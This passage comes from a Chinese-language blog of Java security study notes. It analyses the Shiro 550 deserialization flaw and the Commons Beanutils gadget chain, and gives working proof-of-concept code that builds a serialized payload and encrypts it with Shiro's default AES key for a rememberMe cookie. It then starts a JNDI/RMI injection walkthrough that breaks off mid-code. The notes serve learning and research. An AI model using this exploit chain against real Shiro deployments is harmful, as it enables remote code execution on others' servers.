function_">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">//表示按照默认方式反序列化对象的字段</span><br>        ois.defaultReadObject();<br>        <span class="hljs-comment">//反序列化时直接执行系统命令</span><br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>Shiro使用的是Java原生反序列化（当一个类实现了Serializable接口并且重写readObject方法时，该方法会在对象进行反序列化时被调用），其漏洞成因是反序列化的类<strong>重写了readObject方法</strong>，反序列化时调用readObject() 触发重写类的readObject() 方法</p><p>利用：恶意命令 -&gt; 序列化 -&gt; AES加密 -&gt;  Base64编码 -&gt; rememberMe Cookie 值 -&gt; Base64解码 -&gt; AES解密 -&gt; 反序列化 -&gt; 执行恶意命令</p><h2 id="Shiro-550反序列化"><a href="#Shiro-550反序列化" class="headerlink" title="Shiro 550反序列化"></a>Shiro 550反序列化</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="参考文章：-1"><a href="#参考文章：-1" class="headerlink" title="参考文章："></a>参考文章：</h4><p>关于我学渗透的那档子事之Java反序列化-CB链</p><p><a href="https://www.freebuf.com/articles/web/319397.html">https://www.freebuf.com/articles/web/319397.html</a></p><p>Java代码审计&amp;Shiro反序列化&amp;CB1链</p><p><a href="https://blog.csdn.net/qq_46081990/article/details/135724944">https://blog.csdn.net/qq_46081990/article/details/135724944</a></p><p>CC链 1-7 分析</p><p><a href="https://xz.aliyun.com/news/8908">https://xz.aliyun.com/news/8908</a></p><p>Javaweb安全——反序列化漏洞-CC&amp;CB链思路整理</p><p><a href="https://blog.csdn.net/weixin_43610673/article/details/127580121">https://blog.csdn.net/weixin_43610673/article/details/127580121</a></p><h4 id="1、CC-CB-链-（简单理解）"><a href="#1、CC-CB-链-（简单理解）" class="headerlink" title="1、CC &amp; CB 链 （简单理解）"></a>1、CC &amp; CB 链 （简单理解）</h4><p><strong>shiro反序列化利用工具</strong></p><p>JavaThings - Java安全漫谈笔记相关</p><p><a href="https://github.com/phith0n/JavaThings/tree/master">https://github.com/phith0n/JavaThings/tree/master</a></p><p><strong>Commons Collections 链</strong></p><p>来源 Apache Commons Collections 库，利用该库的 <code>Transformer</code>、<code>LazyMap</code> 等类，在反序列化时自动调用恶意代码</p><p><strong>Commons Beanutils 链</strong></p><p>来源：Apache Commons Beanutils 库，利用 <code>BeanComparator</code> 在反序列化触发排序比较时，调用 getter 方法，从而间接触发另一条漏洞链（常常是 cc 链）</p><p>CB 链生成：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String []args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-comment">//获取 Evil 类，执行 Runtime.getRuntime().exec(&quot;calc.exe&quot;);</span><br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.get(com.govuln.shiroattack.Evil.class.getName());<br>        <span class="hljs-comment">//调用 CommonsBeanutils1Shiro#getPayload，传入序列化的恶意类，生成 CB1 链反序列化的 payload</span><br>        <span class="hljs-type">byte</span>[] payloads = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CommonsBeanutils1Shiro</span>().getPayload(clazz.toBytecode());<br><br>        <span class="hljs-type">AesCipherService</span> <span class="hljs-variable">aes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AesCipherService</span>();<br>        <span class="hljs-comment">//将 key 值Base64 编码</span><br>        <span class="hljs-type">byte</span>[] key = java.util.Base64.getDecoder().decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);<br><br>        <span class="hljs-comment">//使用 AES 加密 payload，</span><br>        <span class="hljs-type">ByteSource</span> <span class="hljs-variable">ciphertext</span> <span class="hljs-operator">=</span> aes.encrypt(payloads, key);<br>        System.out.printf(ciphertext.toString());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="2、一个完整的攻击链通常由以下三个部分组成："><a href="#2、一个完整的攻击链通常由以下三个部分组成：" class="headerlink" title="2、一个完整的攻击链通常由以下三个部分组成："></a>2、一个完整的攻击链通常由以下三个部分组成：</h4><p>1、Source（源）：入口点，通常是指攻击链的起始点，其中用户输入或外部数据进入应用程序。在反序列化漏洞中，readObject 方法通常被认为是源，因为它是从输入流读取数据并进行反序列化的方法。</p><p>2、Sink（执行点）：执行点，是攻击链上的终点，其中攻击者希望执行恶意操作的位置。在反序列化漏洞中，sink 可能是一个动态方法执行、JNDI注入或写文件等操作。</p><p>3、Gadget（链）：连接入口执行的多个类，通过它们的相互方法调用形成攻击链。Gadget 类通常满足一些条件，例如类之间方法调用</p><p>是链式的，类实例之间的关系是嵌套的，调用链上的类都需要是可以序列化的。在反序列化漏洞中，Gadget 类是攻击者构建的、可序列</p><p>化的类，通过构建特定的对象图，使得在反序列化时执行恶意代码。</p><h4 id="3、理解数据结构"><a href="#3、理解数据结构" class="headerlink" title="3、理解数据结构"></a>3、理解数据结构</h4><p>数据结构：</p><p><a href="https://oi-wiki.org/ds/">https://oi-wiki.org/ds/</a></p><p>二叉堆</p><p><a href="https://oi-wiki.org/ds/binary-heap/">https://oi-wiki.org/ds/binary-heap/</a></p><p>堆分为大根堆（父节点值不小于子节点值）和小根堆（父节点值不大于子节点值）</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508110935553.png" alt="null"></p><h4 id="4、CB中的JavaBean利用"><a href="#4、CB中的JavaBean利用" class="headerlink" title="4、CB中的JavaBean利用"></a>4、CB中的JavaBean利用</h4><p>PropertyUtils.getProperty(new Person(),”name”);</p><p>自动调用Person对象里面的getName方法</p><p>PropertyUtils.getProperty(new TemplatesImpl(),”outputProperties”)</p><p>自动调用TemplatesImpl对象里面的getOutputProperties方法</p><h3 id="Shiro-550-CB1-链分析"><a href="#Shiro-550-CB1-链分析" class="headerlink" title="Shiro 550 CB1 链分析"></a>Shiro 550 CB1 链分析</h3><h4 id="利用链流程："><a href="#利用链流程：" class="headerlink" title="利用链流程："></a>利用链流程：</h4><p>**入口点：**PriorityQueue#readObject方法（java&#x2F;util&#x2F;PriorityQueue.java），PriorityQueue类中重写了readObject方法，Shiro反序列化时会调用这个类调用重写的readObject方法</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508110916682.png" alt="null"></p><p>步入 heapify() </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508110920916.png" alt="null"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">// PriorityQueue 想象成一个二叉堆，本质是用一个数组 queue[] 存储的特殊二叉树<br>// heapify 的作用就是把一个“乱序”的数组，重新整理成符合堆规则的小根堆（即父节点值 &lt;= 子节点值）<br>private void heapify() &#123;<br>    for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--)<br>        siftDown(i, (E) queue[i]);<br>&#125;<br></code></pre></td></tr></table></figure><p>跟进 siftDown</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508110921238.png" alt="null"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">// siftDown() 方法其实是 堆化(heapify) 的核心步骤之一，用于把某个元素往下移动，使其符合小根堆规则<br>private void siftDown(int k, E x) &#123;<br>    if (comparator != null)<br>        siftDownUsingComparator(k, x);<br>    else<br>        siftDownComparable(k, x);<br>&#125;<br></code></pre></td></tr></table></figure><p>跟进 siftDownUsingComparator ，堆化操作（heapify）的具体实现，用 <code>Comparator</code> 来比较元素大小。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508110922654.png" alt="null"></p><p>跟进 comparator#compare，<code>Comparator&lt;T&gt;</code> 是一个<strong>函数式接口</strong>，用来定义“两个对象谁大谁小”。</p><p>它不要求对象本身实现 <code>Comparable</code>，可以把比较规则外置。</p><p><strong>返回值规则</strong>：</p><ul><li><p><code>&lt; 0</code> → <code>o1</code> 比 <code>o2</code> 小</p></li><li><p><code>0</code> → 相等</p></li><li><p><code>&gt; 0</code> → <code>o1</code> 比 <code>o2</code> 大</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508110958560.png" alt="null"></p><p>那么接下来就要找到哪里调用了这个接口：</p><p><strong>关键点：BeanComparator.compare</strong></p><p>BeanComparator继承了Comparator类和Serializable类，并且出现了PropertyUtils.getProperty()</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508111009650.png" alt="null"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508111012610.png" alt="null"></p><p>那么，当执行 <code>Object value1 = PropertyUtils.getProperty(o1, this.property);</code>时，对其传参：</p><ul><li><p><code>o1 = new TemplatesImpl()</code></p></li><li><p><code>property = outputProperties</code></p></li><li><p>就会自动调用 <code>TemplatesImpl#getOutputProperties</code> 方法</p></li></ul><p><strong>关键点：getOutputProperties</strong></p><p>找到 getOutputProperties：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508111020514.png" alt="null"></p><p>执行：<code>newTransformer().getOutputProperties();</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508111022417.png" alt="null"></p><p>跟进 newTransformer</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508111023103.png" alt="null"></p><p>跟进getTransletInstance</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508111318767.png" alt="null"></p><p>跟进 defineTransletClasses，当满足 <code>_bytecodes !== null</code>，向下执行 <code>loader.defineClass(_bytecodes[i])</code> ，将_bytecodes[i]中的字节码转换为Class对象，并将该类加载执行。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508111321868.png" alt="null"></p><h4 id="总结调用链："><a href="#总结调用链：" class="headerlink" title="总结调用链："></a>总结调用链：</h4><p>PriorityQueue#readObject（入口点 Source） -&gt; heapify() -&gt; siftDown() -&gt; siftDownUsingComparator() -&gt; comparator.compare() </p><p>-&gt; BeanComparator.compare()</p><p>-&gt; PropertyUtils.getProperty() </p><p>-&gt;  TemplatesImpl#getOutputProperties()（执行点 Sink） -&gt; newTransformer() -&gt; getTransletInstance() -&gt; defineTransletClasses() </p><p>-&gt; loader.defineClass()</p><p>参照图片：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101449749.jpeg" alt="null"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508111343165.png" alt="null"></p><h4 id="总结条件："><a href="#总结条件：" class="headerlink" title="总结条件："></a>总结条件：</h4><ol><li><p>size值大于等于2；<code>size &gt;&gt;&gt; 1</code></p></li><li><p><code>comparator != null</code></p></li><li><p><code>this.property != null</code></p></li><li><p><code>o1 = new TemplatesImpl()</code>&amp;<code>this.property = outputProperties</code></p></li><li><p><code>_name != null</code>&amp;<code>_class == null</code></p></li><li><p><code>_bytecodes != null</code></p></li></ol><h4 id="POC编写分析-："><a href="#POC编写分析-：" class="headerlink" title="POC编写分析 ："></a>POC编写分析 ：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.govuln.shiroattack;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonsBeanutils1Shiro</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//getClass 获取对象的类，getDeclaredField 通过反射获取这个类的声明字段（包括 private）</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        <span class="hljs-comment">//setAccessible(true) 关闭Java语言访问检查，允许程序访问和修改私有字段，允许我们突破私有权限限制，操作私有字段</span><br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//把传入的 value 赋给 obj 对象的这个字段</span><br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] getPayload(<span class="hljs-type">byte</span>[] clazzBytes) <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">// TemplatesImpl 类 常用于加载 XSLT 模板,核心是它 _bytecodes 字段，存放字节码</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-comment">// 使用setFieldValue方法修改其相关成员变量的值</span><br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazzBytes&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>        <span class="hljs-comment">// TransformerFactoryImpl</span><br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-comment">//创建一个 BeanComparator，初始的 property 字段为 null</span><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-literal">null</span>, String.CASE_INSENSITIVE_ORDER);<br>        <span class="hljs-comment">//创建一个 PriorityQueue，使用刚创建的 BeanComparator 作为元素比较器</span><br>        <span class="hljs-keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>, comparator);<br>        <span class="hljs-comment">// stub data for replacement later</span><br>        <span class="hljs-comment">//先往 PriorityQueue 添加两个占位元素 &quot;1&quot;</span><br>        queue.add(<span class="hljs-string">&quot;1&quot;</span>);<br>        queue.add(<span class="hljs-string">&quot;1&quot;</span>);<br><br>        <span class="hljs-comment">//通过反射设置 comparator 的 property 字段为 &quot;outputProperties&quot;,BeanComparator 会在比较时通过反射调用对象的 getOutputProperties() 方法</span><br>        setFieldValue(comparator, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;outputProperties&quot;</span>);<br>        setFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;obj, obj&#125;);<br><br>        <span class="hljs-comment">// ==================</span><br>        <span class="hljs-comment">// 生成序列化字符串</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-comment">//通过 ObjectOutputStream 把构造好的 PriorityQueue 对象序列化成字节数组</span><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(queue);<br>        oos.close();<br><br>        <span class="hljs-keyword">return</span> barr.toByteArray();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java 学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JNDI</title>
    <link href="/2025/09/24/JNDI/"/>
    <url>/2025/09/24/JNDI/</url>
    
    <content type="html"><![CDATA[<h1 id="一、JNDI-简介"><a href="#一、JNDI-简介" class="headerlink" title="一、JNDI 简介"></a>一、JNDI 简介</h1><p>JNDI(Java Naming and Directory Interface，Java命名和目录接口) 是一个应用程序设计的 API，一种标准的 Java 命名系统接口。JNDI 提供统一的客户端 API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将 JNDI API 映射为特定的命名服务和目录系统，使得 Java 应用程序可以和这些命名服务和目录服务之间进行交互。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242106579.png"></p><table><thead><tr><th><strong><font style="color:rgb(102, 102, 102);">协议</font></strong></th><th><strong><font style="color:rgb(102, 102, 102);">作用</font></strong></th></tr></thead><tbody><tr><td><font style="color:rgb(102, 102, 102);">LDAP</font></td><td><font style="color:rgb(102, 102, 102);">轻量级目录访问协议，约定了 Client 与 Server 之间的信息交互格式、使用的端口号、认证方式等内容</font></td></tr><tr><td><font style="color:rgb(102, 102, 102);">RMI</font></td><td><font style="color:rgb(102, 102, 102);">JAVA 远程方法协议，该协议用于远程调用应用程序编程接口，使客户机上运行的程序可以调用远程服务器上的对象</font></td></tr><tr><td><font style="color:rgb(102, 102, 102);">DNS</font></td><td><font style="color:rgb(102, 102, 102);">域名服务</font></td></tr><tr><td><font style="color:rgb(102, 102, 102);">CORBA</font></td><td><font style="color:rgb(102, 102, 102);">公共对象请求代理体系结构</font></td></tr></tbody></table><h1 id="二、JNDI-实现"><a href="#二、JNDI-实现" class="headerlink" title="二、JNDI 实现"></a>二、JNDI 实现</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IRemoteObj</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String keywords)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, AlreadyBoundException &#123;<br>        <span class="hljs-type">IRemoteObj</span> <span class="hljs-variable">remoteObj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObjImpl</span>();<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        r.bind(<span class="hljs-string">&quot;remoteObj&quot;</span>, remoteObj);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteObjImpl</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IRemoteObj</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">RemoteObjImpl</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String keywords)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">upKeywords</span> <span class="hljs-operator">=</span> keywords.toUpperCase();<br>        System.out.println(upKeywords);<br>        <span class="hljs-keyword">return</span> upKeywords;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIRMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        <span class="hljs-type">IRemoteObj</span> <span class="hljs-variable">remoteObj</span> <span class="hljs-operator">=</span> (IRemoteObj) initialContext.lookup(<span class="hljs-string">&quot;rmi://localhost:1099/remoteObj&quot;</span>);<br>        System.out.println(remoteObj.sayHello(<span class="hljs-string">&quot;hello&quot;</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIRMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        initialContext.rebind(<span class="hljs-string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObjImpl</span>());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242106238.png"></p><h1 id="三、JNDI-注入"><a href="#三、JNDI-注入" class="headerlink" title="三、JNDI 注入"></a>三、JNDI 注入</h1><h2 id="3-1-分析漏洞如何产生"><a href="#3-1-分析漏洞如何产生" class="headerlink" title="3.1 分析漏洞如何产生"></a>3.1 分析漏洞如何产生</h2><p>此处断点调试，跟进 lookup</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242107810.png"></p><p>InitialContext.lookup</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242107722.png"></p><p>GenericURLContext.lookup</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242107072.png"></p><p>RegistryContext.lookup</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242107413.png"></p><p>RegistryImpl_Stub.lookup      到这里就不用跟了，攻击方式和 RMI 中攻击注册中心一样，</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242107847.png"></p><blockquote><p>RMI 中的攻击注册中心：<a href="https://www.yuque.com/taohuayuanpang/qxcvxi/rzl0dhpb5pnb8noh#dT3m5">https://www.yuque.com/taohuayuanpang/qxcvxi/rzl0dhpb5pnb8noh#dT3m5</a></p></blockquote><h2 id="3-2-Jndi-RMI"><a href="#3-2-Jndi-RMI" class="headerlink" title="3.2 Jndi + RMI"></a>3.2 <font style="color:rgb(80, 80, 92);">Jndi + RMI</font></h2><h3 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h3><p> 先写一个弹出计算器类并编译：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242107819.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242107878.png"></p><p>之后用 python 开一个 http 服务，监听 7777 端口</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242107851.png"></p><p>服务端：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> 